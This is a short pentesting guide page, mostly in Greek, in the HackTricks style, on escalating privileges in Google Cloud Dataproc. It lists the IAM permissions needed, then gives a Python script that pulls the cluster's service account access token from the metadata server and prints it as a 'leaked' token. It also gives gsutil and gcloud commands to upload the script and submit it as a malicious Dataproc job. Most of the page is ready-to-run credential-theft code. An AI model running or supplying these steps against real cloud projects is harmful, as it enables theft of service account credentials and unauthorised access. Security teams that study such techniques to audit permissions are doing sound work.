# GCP Dataproc Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataproc

{{#ref}}
../gcp-services/gcp-dataproc-enum.md
{{#endref}}

### `dataproc.clusters.get`, `dataproc.clusters.use`, `dataproc.jobs.create`, `dataproc.jobs.get`, `dataproc.jobs.list`, `storage.objects.create`, `storage.objects.get`

Δεν μπόρεσα να αποκτήσω reverse shell χρησιμοποιώντας αυτή τη μέθοδο, ωστόσο είναι δυνατό να leak SA token από το metadata endpoint χρησιμοποιώντας τη μέθοδο που περιγράφεται παρακάτω.

#### Βήματα για εκμετάλλευση

- Τοποθετήστε το job script στο GCP Bucket

- Υποβάλετε ένα job σε ένα Dataproc cluster.

- Χρησιμοποιήστε το job για να αποκτήσετε πρόσβαση στον metadata server.

- Leak το service account token που χρησιμοποιεί το cluster.

<details><summary>Python script to fetch SA token from metadata server</summary>
```python
import requests

metadata_url = "http://metadata/computeMetadata/v1/instance/service-accounts/default/token"
headers = {"Metadata-Flavor": "Google"}

def fetch_metadata_token():
try:
response = requests.get(metadata_url, headers=headers, timeout=5)
response.raise_for_status()
token = response.json().get("access_token", "")
print(f"Leaked Token: {token}")
return token
except Exception as e:
print(f"Error fetching metadata token: {e}")
return None

if __name__ == "__main__":
fetch_metadata_token()
```
</details>

<details><summary>Υποβολή κακόβουλης εργασίας σε Dataproc cluster</summary>
```bash
# Copy the script to the storage bucket
gsutil cp <python-script> gs://<bucket-name>/<python-script>

# Submit the malicious job
gcloud dataproc jobs submit pyspark gs://<bucket-name>/<python-script> \
--cluster=<cluster-name> \
--region=<region>
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
